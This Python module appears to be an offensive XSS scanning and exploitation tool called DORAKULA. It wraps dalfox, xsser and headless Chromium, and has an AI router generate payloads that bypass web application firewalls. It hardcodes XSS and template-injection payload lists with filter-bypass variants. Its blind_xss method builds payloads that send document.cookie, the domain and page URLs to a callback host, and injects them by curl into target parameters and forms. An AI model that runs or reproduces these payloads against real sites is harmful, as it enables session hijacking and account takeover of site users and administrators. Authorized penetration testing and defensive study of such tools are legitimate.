#!/usr/bin/env python3
"""DORAKULA XSS Scanner - Cross-Site Scripting Detection & Exploitation

Comprehensive XSS testing module combining automated tooling (dalfox, xsser)
with AI-enhanced payload generation and DOM-based testing via headless Chromium.
"""

import asyncio
import json
import logging
import subprocess
import re
import base64
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, urlencode, quote

logger = logging.getLogger(__name__)


class XSSScanner:
    """Advanced XSS vulnerability scanner with AI-enhanced payload generation.

    Combines dalfox and xsser automated scanners with custom AI-generated
    payloads, DOM-based XSS testing via headless Chromium, and blind XSS
    callback injection.

    Attributes:
        ai_router: AI router instance for intelligent payload generation.
        timeout: Default timeout for subprocess calls in seconds.
    """

    def __init__(self, ai_router: Any = None, timeout: int = 300):
        """Initialize XSSScanner.

        Args:
            ai_router: AIRouter instance for AI-enhanced operations.
            timeout: Default command timeout in seconds.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        self._dalfox_path: Optional[str] = None
        self._xsser_path: Optional[str] = None
        self._chromium_path: Optional[str] = None
        logger.info("XSSScanner initialized with timeout=%d", timeout)

    def _find_tool(self, tool_name: str) -> Optional[str]:
        """Locate a tool binary on the system PATH.

        Args:
            tool_name: Name of the executable to find.

        Returns:
            Full path to the tool or None if not found.
        """
        try:
            result = subprocess.run(
                ["which", tool_name],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                path = result.stdout.strip()
                logger.debug("Found %s at %s", tool_name, path)
                return path
        except (subprocess.TimeoutExpired, OSError) as exc:
            logger.warning("Failed to locate %s: %s", tool_name, exc)
        return None

    @property
    def dalfox_path(self) -> Optional[str]:
        """Lazy-locate dalfox binary."""
        if self._dalfox_path is None:
            self._dalfox_path = self._find_tool("dalfox")
        return self._dalfox_path

    @property
    def xsser_path(self) -> Optional[str]:
        """Lazy-locate xsser binary."""
        if self._xsser_path is None:
            self._xsser_path = self._find_tool("xsser")
        return self._xsser_path

    @property
    def chromium_path(self) -> Optional[str]:
        """Lazy-locate chromium binary."""
        if self._chromium_path is None:
            for name in ["chromium", "chromium-browser", "google-chrome", "google-chrome-stable"]:
                path = self._find_tool(name)
                if path:
                    self._chromium_path = path
                    break
        return self._chromium_path

    async def scan(self, target: str, depth: int = 2) -> Dict[str, Any]:
        """Run dalfox and xsser XSS scans against the target.

        Executes both dalfox (fast) and xsser (comprehensive) scanners
        in parallel, aggregating results into a unified report.

        Args:
            target: Target URL to scan for XSS vulnerabilities.
            depth: Crawling depth for dalfox (default: 2).

        Returns:
            Dictionary containing dalfox_results, xsser_results,
            confirmed list, potential list, and errors.
        """
        results: Dict[str, Any] = {
            "target": target,
            "depth": depth,
            "dalfox_results": {},
            "xsser_results": {},
            "confirmed": [],
            "potential": [],
            "errors": [],
        }

        async def _run_dalfox() -> None:
            """Execute dalfox scan."""
            if not self.dalfox_path:
                results["errors"].append("dalfox not found on system")
                return
            try:
                cmd = [
                    self.dalfox_path,
                    "url", target,
                    "--depth", str(depth),
                    "--output", "json",
                    "--timeout", str(self.timeout),
                    "--silence",
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=self.timeout
                )
                dalfox_output = stdout.decode("utf-8", errors="replace")
                dalfox_errors = stderr.decode("utf-8", errors="replace")

                findings = []
                for line in dalfox_output.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        entry = json.loads(line)
                        findings.append(entry)
                        if entry.get("type") == "VULN":
                            results["confirmed"].append({
                                "source": "dalfox",
                                "payload": entry.get("payload", ""),
                                "param": entry.get("param", ""),
                                "evidence": entry.get("evidence", ""),
                            })
                        elif entry.get("type") in ("POSSIBLE", "FINDING"):
                            results["potential"].append({
                                "source": "dalfox",
                                "payload": entry.get("payload", ""),
                                "param": entry.get("param", ""),
                            })
                    except json.JSONDecodeError:
                        if "<script" in line.lower() or "xss" in line.lower():
                            results["potential"].append({
                                "source": "dalfox_raw",
                                "detail": line[:500],
                            })

                results["dalfox_results"] = {
                    "findings": findings,
                    "stderr": dalfox_errors[:2000],
                    "return_code": proc.returncode,
                }
                logger.info("dalfox scan completed with %d findings", len(findings))

            except asyncio.TimeoutError:
                results["errors"].append("dalfox scan timed out")
                logger.warning("dalfox scan timed out for %s", target)
            except OSError as exc:
                results["errors"].append(f"dalfox execution error: {exc}")
                logger.error("dalfox execution error: %s", exc)

        async def _run_xsser() -> None:
            """Execute xsser scan."""
            if not self.xsser_path:
                results["errors"].append("xsser not found on system")
                return
            try:
                cmd = [
                    self.xsser_path,
                    "--url", target,
                    "--auto",
                    "--timeout", str(self.timeout),
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=self.timeout
                )
                xsser_output = stdout.decode("utf-8", errors="replace")
                xsser_errors = stderr.decode("utf-8", errors="replace")

                confirmed_xss = []
                potential_xss = []
                for line in xsser_output.splitlines():
                    low = line.lower()
                    if "xss" in low and ("found" in low or "vuln" in low or "injected" in low):
                        confirmed_xss.append(line.strip()[:500])
                    elif "xss" in low or "possible" in low:
                        potential_xss.append(line.strip()[:500])

                results["xsser_results"] = {
                    "confirmed": confirmed_xss,
                    "potential": potential_xss,
                    "stderr": xsser_errors[:2000],
                    "return_code": proc.returncode,
                }
                for entry in confirmed_xss:
                    results["confirmed"].append({"source": "xsser", "detail": entry})
                for entry in potential_xss:
                    results["potential"].append({"source": "xsser", "detail": entry})
                logger.info("xsser scan completed: %d confirmed, %d potential",
                            len(confirmed_xss), len(potential_xss))

            except asyncio.TimeoutError:
                results["errors"].append("xsser scan timed out")
                logger.warning("xsser scan timed out for %s", target)
            except OSError as exc:
                results["errors"].append(f"xsser execution error: {exc}")
                logger.error("xsser execution error: %s", exc)

        await asyncio.gather(_run_dalfox(), _run_xsser())

        if self.ai_router and results["confirmed"]:
            try:
                summary = await self.ai_router.query(
                    f"Classify these XSS findings by severity and exploitability. "
                    f"Provide remediation advice:\n"
                    f"{json.dumps(results['confirmed'][:10], indent=2)}",
                    context="xss_analysis"
                )
                results["ai_analysis"] = summary
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI analysis failed: %s", exc)

        logger.info("XSS scan complete for %s: %d confirmed, %d potential",
                     target, len(results["confirmed"]), len(results["potential"]))
        return results

    async def generate_payloads(self, target: str, context: str) -> Dict[str, Any]:
        """Generate AI-enhanced XSS payloads tailored to the target context.

        Uses AI to craft context-aware XSS payloads based on the injection
        context (HTML body, attribute, JavaScript, URL, etc.).

        Args:
            target: Target URL or parameter context.
            context: Injection context type (html, attribute, javascript,
                     url, svg, template).

        Returns:
            Dictionary with payloads, ai_payloads, bypass_techniques.
        """
        base_payloads: Dict[str, List[str]] = {
            "html": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<iframe src="javascript:alert(1)">',
            ],
            "attribute": [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1) autofocus="',
                "' onfocus='alert(1) autofocus='",
                '" style="background:url(javascript:alert(1))"',
                '"><script>alert(1)</script>',
            ],
            "javascript": [
                "';alert(1);//",
                "-alert(1)-",
                "};alert(1);//",
                "${alert(1)}",
                "`${alert(1)}`",
                "';alert(String.fromCharCode(88,83,83));//",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            ],
            "svg": [
                '<svg><script>alert(1)</script></svg>',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                '<svg><set attributeName=onmouseover to=alert(1)>',
                '<svg><foreignObject><body onload=alert(1)>',
            ],
            "template": [
                '{{7*7}}',
                '${7*7}',
                '<%=7*7%>',
                '{{constructor.constructor("alert(1)")()}}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '#{7*7}',
            ],
        }

        payloads = list(base_payloads.get(context, base_payloads["html"]))

        bypass_payloads: List[str] = []
        for payload in payloads[:5]:
            unicode_payload = payload.replace("alert", "\\u0061lert")
            bypass_payloads.append(f"bypass_unicode:{unicode_payload}")
            mixed = payload[:1] + payload[1:].replace("script", "ScRiPt").replace("alert", "AlErT")
            bypass_payloads.append(f"bypass_mixedcase:{mixed}")

        payloads.extend(bypass_payloads)

        ai_payloads: List[str] = []
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Generate 10 advanced XSS payloads for context '{context}' "
                    f"targeting modern WAF bypasses. Target: {target}. "
                    f"Include only the payload string, one per line. "
                    f"Focus on: event handlers, DOM clobbering, prototype pollution, "
                    f"mutation XSS, and browser-specific quirks.",
                    context="xss_payload_generation"
                )
                if ai_result:
                    for line in ai_result.splitlines():
                        line = line.strip()
                        if line and not line.startswith("#") and len(line) < 500:
                            ai_payloads.append(line)
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI payload generation failed: %s", exc)

        result: Dict[str, Any] = {
            "target": target,
            "context": context,
            "payloads": payloads,
            "ai_payloads": ai_payloads,
            "bypass_techniques": [
                "html_entity_encoding",
                "unicode_encoding",
                "mixed_case",
                "null_byte_injection",
                "double_encoding",
                "base64_encoding",
            ],
            "ai_generated": bool(ai_payloads),
            "total_count": len(payloads) + len(ai_payloads),
        }

        logger.info("Generated %d XSS payloads for context '%s'",
                     result["total_count"], context)
        return result

    async def test_dom_xss(self, target: str) -> Dict[str, Any]:
        """Test for DOM-based XSS using headless Chromium.

        Injects DOM XSS payloads into URL fragments and parameters,
        then uses headless Chromium to detect if the payloads execute
        in the DOM context.

        Args:
            target: Target URL to test for DOM-based XSS.

        Returns:
            Dictionary with findings, sources, sinks, chromium_available.
        """
        results: Dict[str, Any] = {
            "target": target,
            "findings": [],
            "sources": [],
            "sinks": [],
            "chromium_available": self.chromium_path is not None,
            "errors": [],
        }

        dom_payloads: List[Dict[str, str]] = [
            {"payload": '#<img src=x onerror=alert("domxss")>', "type": "hash_injection"},
            {"payload": '#"><script>alert("domxss")</script>', "type": "hash_script"},
            {"payload": '?q=<img src=x onerror=alert("domxss")>', "type": "param_injection"},
            {"payload": '#javascript:alert("domxss")', "type": "hash_javascript"},
            {"payload": '#<svg onload=alert("domxss")>', "type": "hash_svg"},
        ]

        tainted_sources: List[str] = [
            "location.href", "location.hash", "location.search",
            "location.pathname", "document.URL", "document.documentURI",
            "document.referrer", "window.name", "document.cookie",
        ]
        dangerous_sinks: List[str] = [
            "document.write", "document.writeln", "innerHTML",
            "outerHTML", "eval", "setTimeout", "setInterval",
            "Function(", "insertAdjacentHTML",
        ]

        if not self.chromium_path:
            results["errors"].append(
                "Chromium not found - DOM XSS testing requires headless Chromium"
            )
            logger.warning("Chromium not available for DOM XSS testing")
            for p in dom_payloads:
                results["findings"].append({
                    "payload": p["payload"],
                    "type": p["type"],
                    "status": "untested_no_chromium",
                    "test_url": target + p["payload"],
                })
            return results

        for p in dom_payloads:
            test_url = target + p["payload"]
            try:
                cmd = [
                    self.chromium_path,
                    "--headless",
                    "--no-sandbox",
                    "--disable-gpu",
                    "--disable-dev-shm-usage",
                    "--dump-dom",
                    "--timeout=15000",
                    test_url,
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=30
                )
                output = stdout.decode("utf-8", errors="replace")

                if 'alert("domxss")' in output or "alert('domxss')" in output:
                    results["findings"].append({
                        "payload": p["payload"],
                        "type": p["type"],
                        "status": "potential_dom_xss",
                        "test_url": test_url,
                        "evidence": "Payload reflected in DOM output",
                    })
                    for src in tainted_sources:
                        results["sources"].append(src)
                    for sink in dangerous_sinks:
                        results["sinks"].append(sink)
                else:
                    results["findings"].append({
                        "payload": p["payload"],
                        "type": p["type"],
                        "status": "no_reflection",
                        "test_url": test_url,
                    })

            except asyncio.TimeoutError:
                results["errors"].append(f"Chromium timed out for {p['type']}")
                logger.warning("Chromium timeout for %s on %s", p["type"], target)
            except OSError as exc:
                results["errors"].append(f"Chromium error: {exc}")
                logger.error("Chromium error: %s", exc)

        if self.ai_router and results["findings"]:
            try:
                ai_result = await self.ai_router.query(
                    f"Analyze these DOM XSS test results and identify "
                    f"exploitable source-to-sink flows:\n"
                    f"{json.dumps(results['findings'], indent=2)}",
                    context="dom_xss_analysis"
                )
                results["ai_analysis"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI DOM XSS analysis failed: %s", exc)

        logger.info("DOM XSS test complete for %s: %d findings",
                     target, len(results["findings"]))
        return results

    async def blind_xss(self, callback_url: str, target: str) -> Dict[str, Any]:
        """Inject blind XSS payloads with callback URL for out-of-band detection.

        Injects XSS payloads that trigger callbacks when executed by
        backend/admin users, detecting stored XSS in admin panels,
        logs, and other backend contexts.

        Args:
            callback_url: URL to receive callbacks (e.g., Burp Collaborator).
            target: Target URL to inject blind XSS payloads into.

        Returns:
            Dictionary with injected list, callback_url, payloads, errors.
        """
        results: Dict[str, Any] = {
            "target": target,
            "callback_url": callback_url,
            "injected": [],
            "payloads": [],
            "errors": [],
        }

        blind_payloads: List[Dict[str, str]] = [
            {
                "payload": f'<script src="{callback_url}/xss"></script>',
                "context": "html_body",
                "description": "Script tag with callback source",
            },
            {
                "payload": f'<img src=x onerror="fetch(\'{callback_url}/xss?c=\'+document.cookie)">',
                "context": "html_attribute",
                "description": "Image onerror with cookie exfiltration",
            },
            {
                "payload": f'<script>new Image().src="{callback_url}/xss?c="+document.cookie</script>',
                "context": "html_body",
                "description": "Image src cookie exfiltration",
            },
            {
                "payload": f'<svg onload="fetch(\'{callback_url}/xss?d=\'+document.domain)">',
                "context": "html_body",
                "description": "SVG onload domain exfiltration",
            },
            {
                "payload": f'"><script src="{callback_url}/xss"></script>',
                "context": "attribute_breakout",
                "description": "Attribute breakout with script callback",
            },
            {
                "payload": f"javascript:fetch('{callback_url}/xss?c='+document.cookie)",
                "context": "url_scheme",
                "description": "JavaScript URL with cookie callback",
            },
            {
                "payload": f'<input onfocus=fetch("{callback_url}/xss?c="+document.cookie) autofocus>',
                "context": "html_input",
                "description": "Input autofocus with callback",
            },
            {
                "payload": f'<details open ontoggle=fetch("{callback_url}/xss?h="+location.href)>',
                "context": "html5_element",
                "description": "Details ontoggle with href callback",
            },
        ]

        results["payloads"] = blind_payloads

        parsed = urlparse(target)
        params_to_inject: List[str] = []

        if parsed.query:
            for param in parsed.query.split("&"):
                name = param.split("=")[0] if "=" in param else param
                params_to_inject.append(name)

        if not params_to_inject:
            params_to_inject = [
                "q", "search", "query", "name", "username",
                "comment", "message", "email", "input", "value",
                "redirect", "url", "next", "return", "ref",
            ]

        for param in params_to_inject[:10]:
            for bp in blind_payloads[:3]:
                try:
                    inject_params = {param: bp["payload"]}
                    separator = "&" if "?" in target else "?"
                    inject_url = f"{target}{separator}{urlencode(inject_params)}"

                    cmd = [
                        "curl", "-s", "-o", "/dev/null",
                        "-w", "%{http_code}",
                        "-X", "GET",
                        "--max-time", "15",
                        inject_url,
                    ]
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(), timeout=20
                    )
                    http_code = stdout.decode("utf-8", errors="replace").strip()

                    results["injected"].append({
                        "parameter": param,
                        "payload_context": bp["context"],
                        "payload_description": bp["description"],
                        "http_code": http_code,
                        "inject_url": inject_url[:500],
                        "status": "injected_awaiting_callback",
                    })

                except asyncio.TimeoutError:
                    results["errors"].append(
                        f"Timeout injecting into param '{param}'"
                    )
                except OSError as exc:
                    results["errors"].append(
                        f"Curl error for param '{param}': {exc}"
                    )

        for bp in blind_payloads[:2]:
            try:
                form_data = urlencode({
                    param: bp["payload"]
                    for param in params_to_inject[:5]
                })
                cmd = [
                    "curl", "-s", "-o", "/dev/null",
                    "-w", "%{http_code}",
                    "-X", "POST",
                    "-H", "Content-Type: application/x-www-form-urlencoded",
                    "-d", form_data,
                    "--max-time", "15",
                    target,
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=20
                )
                http_code = stdout.decode("utf-8", errors="replace").strip()

                results["injected"].append({
                    "method": "POST",
                    "payload_context": bp["context"],
                    "http_code": http_code,
                    "status": "injected_awaiting_callback",
                })

            except asyncio.TimeoutError:
                results["errors"].append("POST injection timeout")
            except OSError as exc:
                results["errors"].append(f"POST injection error: {exc}")

        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Suggest additional blind XSS injection points and payloads "
                    f"for target {target}. Consider: HTTP headers (Referer, User-Agent, "
                    f"X-Forwarded-For), file uploads, and API endpoints. "
                    f"Callback URL: {callback_url}",
                    context="blind_xss_enhancement"
                )
                results["ai_suggestions"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI blind XSS enhancement failed: %s", exc)

        logger.info("Blind XSS injection complete for %s: %d payloads injected",
                     target, len(results["injected"]))
        return results

